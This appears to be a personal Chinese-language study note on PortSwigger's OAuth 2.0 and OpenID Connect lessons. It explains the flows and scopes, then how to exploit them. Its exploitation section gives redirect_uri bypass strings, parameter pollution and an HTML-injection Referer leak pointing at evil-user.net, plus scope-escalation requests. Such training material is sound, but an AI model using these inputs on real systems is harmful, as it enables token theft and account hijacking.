
# 2023-08-24：筆記 PortSwigger 的 OAuth 2.0 authentication 漏洞.md


Ref:
- https://portswigger.net/web-security/oauth
- https://portswigger.net/web-security/oauth/grant-types
- https://portswigger.net/web-security/oauth/openid
- https://portswigger.net/web-security/oauth/preventing
- Michael Stepankin, 24 March 2021, https://portswigger.net/research/hidden-oauth-attack-vectors

 
-------------------

### 什麼是 OAuth？
OAuth 是常用的授權框架
- 可讓網站和 application request 對 user 在另個 application 中的帳號進行有限訪問
- 最重要的是，OAuth 允許 user 在不向請求 application 暴露登錄憑證的情況下授權訪問權限
- 這意味著 user 可以微調他們想要共享的資料，而不必將帳號的完全控制權交給第三方。


基本的 OAuth 流程被廣泛用於集成需要訪問 user 帳號中某些資料的第三方功能
- 例如，app 可能使用 OAuth 請求訪問你的 email 聯繫人列表，以便向你推薦要聯繫的人
- 不過，同樣的機制也用於提供第三方身份驗證服務，允許 user 使用他們在不同網站上擁有的帳號登錄


注意
- 儘管 OAuth 2.0 是當前標準，但一些網站仍使用傳統 1a 版本
- OAuth 2.0 是從零開始寫的，不是從 OAuth 1.0 發展而來。因此，兩者有很大不同


下面內容，`OAuth` 都是指 OAuth 2.0

---------

### OAuth 2.0 如何運作？
OAuth 2.0 最初是作為一種在 application 之間共享訪問特定資料的方式而開發的
- 它通過定義三方(即 client application、resource owner 和 OAuth service provider)之間一系列交互來運作
  - **Client application:**
    - 希望訪問 user 資料的網站或 application
  - **Resource owner:**
    - client application 想要訪問其資料的 user
  - **OAuth service provider:**
    - 控制 user 資料及其訪問的網站或 application
    - 它們通過提供與 authorization server 和 resource server 互動的 API 來支持 OAuth



實際的 OAuth 流程有許多不同的實作方式
- 這些方式被稱為 OAuth `flows` 或「`授權類型(grant types)`」
- 下面將重點討論「`授權代碼(authorization code)`」和「`固有授權類型(implicit grant types)`」
  - 因為這兩種類型是最常見的
  
概括地說，這兩種授權類型(grant types)都涉及以下階段:
1. client application request 訪問 user 資料的一個 subset，指定要使用的授權類型(grant type)和訪問權限
2. 提示 user 登錄 OAuth service ，並明確同意所請求的訪問
3. client application 會收到一個唯一的訪問 token，證明 user 允許其訪問請求的資料
    - 具體方式因授權類型(grant type)不同而大相徑庭。
4. client application 使用訪問 token 呼叫 API，從 resource server 取相關資料





下面介紹的兩種授權類型(grant types)的細節

---------



### 什麼是 OAuth 授權類型？
OAuth 授權類型(grant types)決定了 OAuth 過程中所涉及步驟的確切順序
- 授權類型(grant types)還會影響 client application 在每個階段與 OAuth service 的溝通方式，包括 access token 的發送方式
- 因此，授權類型(grant types)通常被稱為 `OAuth flows`



在 client application 啟動相應流程之前，必須配置 OAuth service 以支持特定的授權類型
- client application 在向 OAuth server 發送的初始授權請求中指定要使用的授權類型



有幾種不同的授權類型
- 每種類型都有不同程度的複雜性和安全考慮
- 下面將重點討論 `authorization code` 和「`固有授權類型(implicit grant types)`」
  - 這兩種類型是目前最常見的

---------


## OAuth 範圍(scopes)
對於 OAuth 授權類型
- client application 都必須指定要訪問的資料以及要執行的操作類型
- 為此，client application 必須向 OAuth service 發送的授權請求的 `scope` 參數



對於基本 OAuth，client application 可以請求訪問的 scope 對每個 OAuth service 來說都是唯一的
- 由於 scope 的名稱只是一個任意的字符，因此**不同提供商的格式會有很大不同**
- 有些提供商甚至使用完整的 URI 作為 scope 名稱，類似於 REST API
  

例如，當請求對 user 的 contact list 進行讀取訪問時，根據所使用的 OAuth service，scope 名稱可能採用以下任何形式:

```
scope=contacts
scope=contacts.read
scope=contact-list-r
scope=https://oauth-authorization-server.com/auth/scopes/user/contacts.readonly
```

不過，在使用 OAuth 進行身份驗證時，通常會使用標準化的 OpenID Connect scope
- 例如，scope `openid profile` 將允許 client application 讀取一組預定義的 user 基本資訊
  - 如 email address, user name 等



---------



### 授權碼授權類型(Authorization code grant type)
授權碼授權類型(Authorization code grant type)最初看起來相當複雜，但實際上比想像的要簡單得多


簡而言之，client application 和 OAuth service 首先使用 redirects 來交換一系列 browser-based HTTP requests，從而啟動流程
- user 會被詢問是否同意所請求的訪問
- 如果同意，client application 就會獲得一個授權碼(`authorization code`)
- 然後，client application 將此 code 與 OAuth service 交換，以獲得一個 `access token` (access token)
- 並可使用該 token 呼叫 API 來取相關的 user 資料


從 code/token 交換開始的所有溝通都是通過一個預先配置好的安全  back-channel 從 server 發送到 server 的
- 因此 **eud user 是看不到的**
- 這安全通道在 client application 首次向 OAuth service 註冊時建立
- 此時，還會產生一個 `client_secret`，client application 在發送這些 server 到 server 的 request 時必須使用該 `client_secret` 進行身份驗證


由於最敏感的資料(`access token` 和 user 資料)不會通過瀏覽器發送
- 因此這種授權類型可以說是最安全的
- 如果可能，server side application 最好始終使用這種授權類型


![](https://portswigger.net/web-security/images/oauth-authorization-code-flow.jpg)  



**1. 授權請求:**  
client application 向 OAuth service 的 `/authorization` endpoint 要求獲得訪問特定 user 資料的權限
- (不同提供商的 endpoint 可能有所不同)


```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

這 request 包含以下值得注意的 parameters，通常是用 query string:
This request contains the following noteworthy parameters, usually provided in the query string:
- `client_id`(必要參數)
  - 包含 client application 的 unique identifier
  - 該值在 client application **向 OAuth service 註冊時產生**
- `redirect_uri`
  - 向 client application 發送 `authorization code` 時 user browser 應 redirect 到的 URI
  - 也稱為 `callback URI` 或 `callback endpoint`
  - **許多 OAuth 攻擊都是利用了該參數驗證中的漏洞**  
- `response_type`
  - 決定 client application 期望得到哪種類型的 response
  - 因此也決定要啟動哪種流程
  - 對於 `authorization code grant type`，其值應為 `code`
- `scope`
  - 用於指定 client application 希望訪問 user 的資料 subset
  - 請注意，這些可能是 OAuth provider 設置的自定義範圍，也可能是 OpenID Connect 規範定義的標準化範圍
- `state`
  - 存儲與 client application 上的當前 session 相關的唯一、不可猜測的值
  - OAuth service 應在 response 中返回此精確值以及 `authorization code`
  - 該參數可作為 client application 的一種 CSRF token，確保向 `/callback` 發 request 與發起 OAuth 流程的 request 來自同一人

**2. User login and consent:**  
authorization server 收到初始 request 後
- 會將 user redirect 向到 login page，提示 user login 其在 OAuth provider 的帳號
- 例如，這通常是他們的社交媒體帳

然後
- user 將看到 client application 希望訪問的資料列表
- 這些資料基於 authorization request 中定義的 scrope
- user 可以選擇是否同意訪問

一旦 user 批准了 client application 的給定 scope，只要 user 與 OAuth service 的 session 仍然有效，這一步就會自動完成
- 換句話說，user 第一次選擇 Log in with social media 時，需要手動登錄並給予同意，但以後再次訪問 application，通常只需單擊一下即可重新登錄


**3. 授權代碼授權(Authorization code grant):**  
如果 user 同意訪問請求，browser 將被 redirect 到在授權請求的 `redirect_uri` 指定的 `/callback` endpoint
- 由此產生的 `GET` request 將包含作為 query string 的 authorization code
- 根據 config，它還可能發送與 authorization request 中相同值的 `state` 參數



```
GET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```


**4. `access token` 請求：**  
client application 收到 `authorization code` 後，需要將其換成 `access token`
- 它會向 OAuth service 的 `/token` 發 server to server 的 POST request
- 從這時起，所有溝通都在後端進行，攻擊者通常無法觀察或控制


```
POST /token HTTP/1.1
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8
```

除了 `client_id` 和 authorization `code` 外，你還會注意到以下新參數:
- `client_secret`
  -  client application 必須使用在向 OAuth service 註冊時分配的密鑰來驗證自己的身份
- `grant_type`
  - 用於確保新的 endpoint 知道 client application 想要使用哪種授權類型
  - 在這情況，應將其設置為 `authorization_code`

**5. Access token grant:**  
OAuth service 將驗證 access token request
- 如果符合預期，server 就會 response，向 client application 授權具有所請求 scope 範圍的 access token


```json
{
  "access_token": "z0y9x8w7v6u5",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid profile",
  …
}
```


**6. API call:**  
現在，client application 有了 `access code`，可以從 `resource server` 取 user 資料
- 為此，client application 會向 OAuth service 的 `/userinfo` call API
- `access token` 放在 `Authorization: Bearer` header 中，以證明 client application 有權限訪問這些資料



```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

**7. 資源授權(Resource grant):**  
Resource server 應驗證 token 是否有效，是否屬於當前 client application 
- 如果是，它將 response 根據 token 的 scope 所請求的資源，即 user 資料



```json
{
  "username":"carlos",
  "email":"carlos@carlos-montoya.net",
  …
}
```

---------

## 固有授權類型(Implicit grant type)
固有授權類型(Implicit grant type) 要簡單得多
- client application  是在 user 同意後立即接收 `access token`
- (而不是先取得授 `authorization code`，然後再用 `authorization code` 交換 `access token`)



為什麼不總是使用固有授權類型(Implicit grant type)
- **因為它的安全性要低得多**
- 所有溝通都是通過 browser redirect 進行的
- 沒有像 authorization code flow 那樣的安全後端通道
- 這意味著敏感的 `access token` 和 user 資料更容易受到潛在攻擊


固有授權類型(Implicit grant type)更適合 SPA 和 native desktop applications
- 因為它們無法在後端輕鬆存儲 user 保密資訊，因此無法從使用 authorization code grant type 中獲益



![](https://portswigger.net/web-security/images/oauth-implicit-flow.jpg)  




**1. 授權請求( Authorization request):**  
固有流程(implicit flow)的開始方式與 authorization code flow 大致相同
- 唯一的主要區別是，`response_type` 參數必須設置為 `token`



```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

**2. User login and consent:**  
 user 登錄並決定是否同意所請求的權限。這過程與 authorization code flow 程完全相同



**3. 授權 Access token:**  
如果 user 同意所請求的訪問權限，那事情就開始有所不同了
- OAuth service 會將 user 的 browser redirect 到授權請求中指定的 `redirect_uri`
- 不過，它不會發送包含 `authorization code` 的 queryString，而是以 URL fragment 的形式發送 `access token` 和其他 token 特定資料

```
GET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: client-app.com
```


由於 `access token` 是在 URL fragment 中發送的
- 因此不會直接發送給 client application
- 相反，client application 需要用 script 來讀 fragment 並存儲它


**4. API call:**  
client application 從 URL fragment 讀取 `access token` 後
- 就可以用它向 OAuth service 的 `/userinfo` 呼叫 API。與 authorization code flow 不同，這也是通過 browser 進行


```
GET /userinfo HTTP/1.1
Host: oauth-resource-server.com
Authorization: Bearer z0y9x8w7v6u5
```

**5. Resource grant:**  
Resource server 驗證 token 是否有效，是否屬於當前 client application
- 如果是，它將根據與 `access token` 相關聯的 scope 發送所請求的資源，即 user 資料


```json
{
  "username":"carlos",
  "email":"carlos@carlos-montoya.net"
}
```


---------


## OAuth 身份驗證
雖然 OAuth 最初並非用於此目的，但它已發展成 user 身份驗證手段
- 對於 OAuth 身份驗證機制來說，基本的 OAuth 流程大致相同
- 主要區別在於 client application 如何使用收到的資料
- 從 end  user 角度來看，OAuth 身份驗證的結果與基於 SAML 的 single sign-on (SSO)
- 在這些資料中，我們將專門討論類似 SSO 的使用案例中的漏洞


OAuth 身份驗證的一般實作的方式如下:
1.  user 選擇使用其社交媒體帳號登錄
    - 然後，client application 使用社交媒體網站的 OAuth service 請求訪問一些資料，以識別 user 身份
    - 例如，這可能是 user 帳號註冊的 email
2. 收到 `access token` 後，client application 從 resource server 請求訪問這些資料
    - (通常是專用的 `/userinfo` endpoint)
3. 收到資料後，client application 就用它代替 username 登錄 user
    - 從 authorization server 接收到的 **`access token` 通常用來代替密碼**


可以在下面的練習看看到一個簡單的例子
- 在 Burp proxy 時完成 Log in with social media 選項，然後 proxying traffic 中的 OAuth 流程
- 可以用 `wiener:peter` 登錄


練習題: Authentication bypass via OAuth implicit flow
- https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

---------

## OAuth 身份驗證漏洞是如何產生的？
OAuth 身份驗證漏洞，部分原因是 spec 在設計上相對模糊和靈活
- 雖然基本功能都需要一些強制 component，但絕大多數實作方式都是完全 optional
- 有很多機會讓不良做法乘虛而入。

OAuth 的另個關鍵問題是普遍缺乏內建安全功能
- 安全性幾乎完全依賴於開發人員使用正確的配置選項組合，並在此基礎上實作自己的附加安全措施，如強大的輸入驗證
- 需要考慮的事情很多，如果你對 OAuth 缺乏經驗，就很容易出錯。
- 根據授權類型(grant type)的不同，高度敏感的資料也會通過 browser 發送，這就為攻擊者截獲這些資料提供了各種機會



---------


## 識別 OAuth 身份驗證(Identifying OAuth authentication)
識別 application 是否使用 OAuth 身份驗證相對簡單
- 如果你在不同的網站上看到使用帳號登錄的選項，這就充分說明正在使用 OAuth


最可靠方法是通過 Burp proxy 檢查相應的 HTTP message
- 無論用哪種 OAuth 授權類型(grant type)，flow 的第一個 request 始終是對 `/authorization` endpoint 的請求
- 其中包含一些專門用於 OAuth 的 queryString。尤其注意 `client_id`, `redirect_uri`, `response_type`
  
例如，一個授權請求通常是這樣的

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

---------

## Recon (Reconnaissance)

你需要研究構成 OAuth 流程的各種 HTTP 交互
- 稍後會介紹一些需要注意的具體事項
- 如果使用的是**外部 OAuth service**，你應該能從發送授權請求的 hostname 中識別出具體的提供商
- 由於這些服務提供的是公共 API，因此通常會有詳細的文件，告訴你各種有用的資訊，例如 endpoint 確切名稱和正在使用的配置選項

知道 authorization server 後，應嘗試向以下標準 endpoints 發 GET request:
- 通常會 return 一個 JSON config，其中包含關鍵資訊
  - 如可能支持的附加功能的詳細資訊。有時會提醒你注意更廣泛的攻擊面以及 doc 中可能未提及的受支持功能

```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```


---------

## 利用 OAuth 身份驗證漏洞
client application 的 OAuth 實作以及 OAuth service 本身的配置都可能存在漏洞
- 下面展示如何利用這兩種情況下最常見的一些漏洞


1. client application 中的漏洞
  - [不正確實作的固有授權類型(Implicit grant type)](https://portswigger.net/web-security/oauth#improper-implementation-of-the-implicit-grant-type)
  - [有缺陷的 CSRF 防護](https://portswigger.net/web-security/oauth#flawed-csrf-protection)
- OAuth service 中的漏洞
  - [洩漏 authorization codes 和 access tokens](https://portswigger.net/web-security/oauth#leaking-authorization-codes-and-access-tokens)
  - [有缺陷的 scope 驗證](https://portswigger.net/web-security/oauth#flawed-scope-validation)
  - [未經驗證的註冊 user](https://portswigger.net/web-security/oauth#unverified-user-registration)


**不正確實作的固有授權類型(Implicit grant type):**  
由於通過 browser 發送 `access token` 會帶來危險
- 固有授權類型(Implicit grant type)主要推薦用於 SPA
- 不過，由於固有授權類型(Implicit grant type)相對簡單，也經常用於傳統的 client-server web application


在此流程中
- `access token` 通過 user browser 以 `URL fragment` 形式從 OAuth service 發送到 client application
- 然後，client application 用 JavaScript 讀 `access token`
- 問題是，如果 application 想在 user 關閉頁面後保持 session，就需要在某個地方存儲當前 user 資料
  - (通常是 user ID 和 `access token`)


為了解決這個問題
- client application 通常會在 POST request 中向 server submit 這些資料
- 然後為 user 分配 session cookie，從而有效地登錄 user
- 這種 request 大致等同於傳統的基於密碼的登錄方式中發送的請求
- **不過，在這情況，server 沒有任何機密或密碼可與 submit 的資料進行比較，這意味著服務器是隱式信任的**


在這隱式 flow 中，`POST` request 會通過 browser 暴露給攻擊者
- 因此，如果 client application 沒有正確檢查 `access token` 是否與 request 中的其他資料相匹配，就會導致嚴重的漏洞
- 在這情況，攻擊者只需更改發送到 server 的參數，就能冒充任何 user


練習題: Authentication bypass via OAuth implicit flow
- https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow


**有缺陷的 CSRF 防護:**  
儘管 OAuth 流程中的許多都是 optional，但強烈建議使用其中某些 component，除非有重要理由不使用它們
- `state` 參數就是一個例子。


`state` 最好包含不可猜測的值
- 例如 user 首次啟動 OAuth 流程時與 user session 綁定 hash
- 然後，該值會在 client application 和 OAuth service 之間來回傳遞，作為 client application 的 `CSRF token`
- 因此，如果你注意到授權請求沒有發送 `state` 參數，那麼從攻擊者的角度來看，可能意味著他們可以誘騙 user 的 browser 完成 OAuth 流程之前，自己啟動該流程
  - 類似於傳統的 CSRF 攻擊。這可能會造成嚴重後果，具體取決於 client application 如何使用 OAuth


假設一個網站允許 user 使用密碼或使用 OAuth 連到社交媒體配置文件來登錄
- 在這情況，如果沒有使用 `state` 參數，攻擊者就有可能通過將受害 user 的帳號綁定到其自己的社交媒體帳號來劫持其在 client application 上的帳號
- 但如果網站只允許 user 通過 OAuth 登錄，那 `state` 的重要性就會降低
  - 但是，不使用 `state` 仍然可以讓攻擊者構建 CSRF 攻擊，即誘騙 user 登錄攻擊者的帳號



練習題: Forced OAuth profile linking
- https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking




**洩漏 `authorization codes` 和 `access tokens`:**  
最臭名昭著的 OAuth 漏洞可能是當 OAuth service 本身的配置使攻擊者能夠竊取其他 user 相關聯的 `authorization codes` 或 `access token`
- 通過竊取 `authorization codes` 或 `access token`，攻擊者可以訪問受害者的資料
- 最終，這可能會完全危及他們的帳號
- 攻擊者有可能在任何註冊了該 OAuth service 的 client application 上以受害者 user 的身份登錄


根據授權類型(grant type)
- `code` 或 `token` 會通過受害者的 browser 發送到授權請求的 `redirect_uri` 參數中指定的 `/callback`
- 如果 OAuth service 未能正確驗證該 `URI`，攻擊者就有可能構建類似 CSRF 攻擊，誘使受害者的 browser 啟動 OAuth 流程，將 `code` 或 `token` 發到攻擊者控制的 `redirect_uri`

在 authorization code flow，攻擊者有可能在使用前竊取受害者的 `code`
- 然後，他們可以將 `code` 發到 client application 的合法 `/callback` endpoint (原來的 `redirect_uri`)，以取得對 user 帳號的訪問權限
- 在這情況，攻擊者甚至不需要知道 client secret 或由此產生的 `access token`
- 只要受害者與 OAuth service 有個有效的 session，client application 就會代表攻擊者完成 code/token 交換，然後登錄受害者帳號

注意:
- 用 `state` 或 `nonce` 保護不一定能阻止這些攻擊，因為攻擊者可以從自己的 browser 中產生新的值

練習題: OAuth account hijacking via redirect_uri
- https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri


更安全的 uthorization servers 會要求在交換 code 時發送一個 `redirect_uri`
- 然後，server 可以檢查是否與初始授權請求中收到的參數一致，如果不一致，則拒絕交換
- 由於這發生在 server 通過安全後端通道發出的請求中，攻擊者無法控制第二個 `redirect_uri` 參數


**有缺陷的 `redirect_uri` 驗證:**  
由於上個練習題出現的攻擊類型
- client application 的最佳做法是在向 OAuth service 註冊時，提供一份 callback URIs 白名單
- 這樣，當 OAuth service 收到新請求時，就根據白名單驗證 `redirect_uri`
- 在這情況，提供外部 URI 很可能會導致錯誤
- 不過，仍有些方法可以繞過這種驗證



審核 OAuth flow 時，要去測試 `redirect_uri`，來了解它的驗證方式。例如
- 有些實作只檢查字串是否以正確的 prefix (如經批准的 domain)，從而允許使用一系列子目錄
  - 你應該嘗試刪除或加任意 path, queryString 和 fragments，看看可以更改哪些內容而不會引發錯誤
- 如果能在默認 `redirect_uri` 參數中加額外值，就有可能利用 OAuth service 不同 component 對 URI 解析的差異
  - 例如，你可以嘗試以下技術:
    - `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
    - 如果不熟悉這些技術，可以讀看看這兩篇:
      - https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses
      - https://portswigger.net/web-security/cors#errors-parsing-origin-headers
- 你可能偶爾會遇到 server-side parameter pollution 漏洞
  - 為以防萬一，你應嘗試送出如下重複的 `redirect_uri` 參數
  - `https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`
- 有些 server 還會對 `localhost` URI 進行特殊處理
  - 因為經常在開發過程中使用
  - 在某些情況下，任何以 localhost 開頭的 redirect URI 在 production 環境中都可能被意外允許
  - 這樣，你就可以通過註冊 `localhost.evil-user.net` 這樣的 domain 來繞過驗證


需要注意的是，不應將測試局限於單獨 `redirect_uri` 參數
- 你經常需要嘗試對多個參數進行不同組合的更改
- 有時，更改一個參數會影響其他參數的驗證
  - 例如，將 `response_mode` 從 `query` 改為 `fragment` 有時會改變對 `redirect_uri` 的解析，從而允許提交否則會被阻止的 `URI`
- 同樣，如果你注意到支持 `web_message` response mode，這通常會允許在 `redirect_uri` 中使用更多的 subdomain


**通過 proxy page 竊取 `code` 和 `access token`:**  
對於防禦強大的目標，可能你無論嘗試什麼方法，都無法成功提交外部 domain 作為 `redirect_uri`。這並不意味著要放棄  


到了這個階段
- 你應該對可以竄改 URI 的哪些部分有相對深入的了解
- 現在的關鍵是利用這些知識，嘗試在 client application 取得更廣泛的攻擊面
- 換句話說，試著找出是否可以更改 `redirect_uri` 參數，使其指向白名單 domain 上的任何其他頁面


嘗試找到可以成功訪問不同 subdomain 或 path 的方法
- 例如，默認 URI 通常位於特定於 OAuth 的 path 上，如 `/oauth/callback`，而該路徑不太可能有任何有趣的子目錄
- 不過，你可以使用 directory traversal 來提供 domain 中的任意 path


類似這樣
```
https://client-app.com/oauth/callback/../../example/path
```

在 backend 可能被解析為:


```
https://client-app.com/example/path
```

一旦確定了可以將哪些其他頁面設為 redirect URI
- 就應該檢查它們是否存在其他漏洞，以便有可能利用這些漏洞洩漏 code/token
- 對於 authorization code flow，你需要找到能讓你訪問 queryString 的漏洞
- 而對於固有授權類型(Implicit grant type)，需要讀取 URL fragment



為此，最有用的漏洞之一是 open redirect
- 你可以將其用作 proxy，將受害者連同他們的 code/token 轉發到攻擊者控制的 domain，在那裡你可以 host 任何的惡意 script

注意
- 對於固有授權類型(Implicit grant type)，竊取 `access token` 並不只是讓你能在 client application 上登錄受害者的帳號
- 由於整個隱式流程都是通過 browser 進行的，你還可以用 token 向 OAuth service 的 resource server 發出自己的 API call
  - 這樣就可以取得通常無法從 client application Web UI 訪問的敏感 user 資料


練習題: Stealing OAuth access tokens via an open redirect
- https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect



除 open redirects 外，你還應查找允許你提取 code/token 並將其發送到外部 domain 的任何其他漏洞。一些很好的例子包括:
- **處理 query parameters 和 URL fragments 的不安全 JavaScript**
  - 在某些情況下，你可能需要確定一個較長的小工具鏈，使你能夠通過一系列 script 傳遞 token，最終將其洩漏到外部 domain

- **XSS 漏洞**
  - 雖然 XSS 本身有巨大影響，但在 user 關閉頁面或離開前，攻擊者通常有小段時間可以訪問 user 的 session
  - 由於 session  cookie 通常用 `HTTPOnly`，攻擊者無法使用 XSS 直接訪問它們
  - 但是，通過竊取 OAuth code/token，攻擊者可以在 user 自己的 borwser 中訪問 user 的帳號
  - 這樣，他們就有更多的時間來探索 user 的資料並執行有害操作，從而大大增加了 XSS 的嚴重性
- **HTML injection 漏洞**
  - 在無法 inject JavaScript 的情況下(如，由於 CSP 限制)，你仍然可以使用簡單的 HTML inject 來竊取 code
  - 如果能將 `redirect_uri` 指向一個可以 inject 自己的 HTML 內容的頁面，就有可能通過 `Referer` header 洩露 code
  - 例如，`<img src="evil-user.net">`。在嘗試取得圖片時，某些瀏覽器(如 Firefox)會在請求的 `Referer` header 中發送完整的 URL，包括 queryString

練習題: Stealing OAuth access tokens via a proxy page
- https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page


**有缺陷的 scope 驗證:**  
在任何 OAuth 流程中
- user 必須根據授權請求中定義的 scrope 請求的訪問
- 由此產生的 token 只允許 client application 訪問 user 批准的 scope
- 但在某些情況下，由於 OAuth service 的驗證缺陷，攻擊者有可能升級具有額外權限的 `access token` (被盜或使用惡意 client application 取得)
  - 升級過程取決於授權類型(grant type)



**Scope 升級，authorization code flow：**  
使用 authorization code grant type 時， user 的資料是通過安全的 server to server 溝通的
- 第三方攻擊者通常無法直接操縱
- 不過，通過在 OAuth service 中註冊自己的 client application，仍有可能達到相同的效果。



例如
- 假設攻擊者的惡意 client application 最初使用 `openid email` scope 請求訪問 user 的 email
- user 批准請求後，惡意 client application 會收到一個 `authorization code`
- 由於攻擊者控制著他們的 client application，因此他們可以在 code/token 交換請求中加另個附加 `profile` scope 的 `scope` 參數

```
POST /token
Host: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```



如果 server 沒有根據初始授權請求的 scope 進行驗證
- 有時就會使用新 scope 產生 `access token`，並發送給攻擊者的 client application
- 然後，攻擊者就可以使用自己的 app 進行必要的 API call，訪問 user 的配置文件資料

```json
{
  "access_token": "z0y9x8w7v6u5",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "openid email profile",
  …
}
```



**Scope 升級，implicit flow:**  
對於固有授權類型(Implicit grant type)，`access token` 是通過 browser 發送的
- 意味著攻擊者可以竊取無辜 client application 相關的 token 並直接使用它們
- 一旦竊取 `access token`，他們就可以向 OAuth service 的 `/userinfo` 發基於 browser 的普通 request
  - 並在此過程中手動加新的 scope 參數


理想情況下
- OAuth service 應根據產生 token 時使用的 scope 來驗證此 scope
- 但情況並非總是如此。只要調整後的權限不超過先前授權該 client application 的訪問級別，攻擊者就有可能訪問更多資料，而無需 user 進一步批准



**未經驗證的註冊 user:**  
通過 OAuth 對 user 進行身份驗證時
- **client application 會隱含地假設 OAuth provider 存的資訊是正確的。這可能是一個危險的假設**


一些提供 OAuth service 的網站允許 user 在未驗證其資訊(某些情況下包括 email)的情況下註冊帳號
- 攻擊者可以利用這一點，使用與目標 user 相同的資訊(如已知的 email)在 OAuth provider 註冊一個帳號
- 然後，client application 可能會允許攻擊者通過 OAuth provider 的這一欺詐帳號以受害者身份登錄


---------

## 利用 OpenID Connect 擴展 OAuth
用於身份驗證時，OAuth 通常會通過 `OpenID Connect layer` 進行擴展
- Layer 提供了一些與識別和驗證 user 的相關附加功能


## 什麼是 OpenID Connect ?
OpenID Connect 擴展了 OAuth 協議
- 在基本 OAuth 實作基礎上提供了一個專用身份和驗證層，可以更好地支持 OAuth 的身份驗證 use case

OAuth 設計之初並沒有考慮到身份驗證
- 它只是種在 app 之間對特定資源進行授權的手段
- 許多網站將 OAuth 定制為身份驗證機制
- 為了這目的，通常會要求讀取基本的 user 資料
- 如果他們被授權了這種訪問權限，則假定 user 在 OAuth provider 這邊進行了身份驗證


這些普通的 OAuth 身份驗證機制遠非理想
- 首先，client application 無法知道 user 是在何時、何地或以何種方式通過身份驗證的
- 由於這些實作都是自定義的變通辦法，因此也沒有為此目的請求 user 資料的標準方法
- 為了正確支持 OAuth，client application 必須為每個 provider 配置單獨的 OAuth 機制
  - 每個機制都有不同的 endpoint、獨特的 scope set 等


OpenID Connect 通過加入標準化的身份相關功能解決了許多此類問題，使通過 OAuth 進行身份驗證的方式更加可靠和統一

---------


### OpenID Connect 如何運作?
OpenID Connect 完全符合正常的 OAuth 流程
- 從 client application 角度來看，主要區別在所有 provider 都有套額外/標準化的 scope set，以及額外的 response type: `id_token`


**OpenID Connect 的角色:**  
OpenID Connect 的角色與標準 OAuth 基本相同。主要區別在於規範使用的術語略有不同
- **依賴方(Relying party)**: 請求對 user 進行身份驗證的 application。這與 OAuth client application 同義
- **End user**: 正在接受身份驗證的 user。與 OAuth `resource owner` 同義
- **OpenID provider**: 指能夠支持 OpenID Connect 功能的 OAuth service



**OpenID Connect 權利(claims)和 scope:**  
術語 `claims` 是指 resource server 上 user 資訊的 key value 對
- 一個例子是 `"family_name": "Montoya"`


基本 OAuth 的 scope 對每個 provide 都是唯一的，而 OpenID Connect 不同，都使用一套相同的 scope
- 為了使用 OpenID Connect，client application 必須在授權請求中指定 openid scope。然後，它們可以包含多個其他標準 scope:
  - profile
  - email
  - address
  - phone


每個 scope 都對應於 OpenID spec 中定義的有關 user 的 subset 的讀取訪問權限
- 例如，scope `openid profile` 將授權讀取與 user 身份有關的 `claims` 權限，如 `family_name`, `given_name`, `birth_date` 等


**ID token:**  
OpenID Connect 提供的另個主要新增功能是 `ID_token`response type
- 它會 return 一個用 JSON 網路簽名(JSON web signature, JWS)簽署的 JSON 網路令牌(JSON web token, JWT)
- JWT payload 包含一個基於最初請求的 scope 的請求列表
  - 它還包含有關 user 上次通過 OAuth service 驗證的方式和時間的資訊
  - client application 可利用這些資訊來判斷 user 是否已得到充分驗證


使用 `id_token` 的主要好處是減少 client application 和 OAuth service 之間需要發送的 request 數量
- 從而提高了整體性能
- user 無需先取得 `access token`，然後再單獨請求 user 資料
- 而是會在 user 通過身份驗證後立即向 client application 發送包含這些資料的 `ID token` 



`ID token` 中傳輸的資料的完整性是基於 JWT 加密簽名的，而不是像基本 OAuth 簡單地依賴於可信通道(backend)
- 因此，使用 `ID token` 有助於防範某些中間人攻擊
- 不過，由於用於簽名驗證的加密密鑰是通過同一網路通道傳輸的 (通常在 `/.owned/jwks.json` 中公開)，因此仍有可能受到某些攻擊


注意，OAuth 支持多種 response types
- 因此 client application 完全可以使用基本 OAuth response types 和 OpenID Connect 的 `id_token` response types 發送 authorization request

```
response_type=id_token token
response_type=id_token code
```

在這情況，`ID token` 和 `code` 或 `access token` 將同時發到 client application 

---------



## 識別 OpenID Connect
如果 client application 正在使用 OpenID connect，從授權 request 就可以明顯看出來
- 最簡單的檢查方法是找強制性的 `openid` scope
- 即使登錄過程最初看起來沒有使用 OpenID Connect，仍值得檢查 OAuth service 是否支持它
- 你只需嘗試加入 `openid` scope 或將 response type 更改為 `id_token` 並觀察是否會導致錯誤


與基本 OAuth 一樣
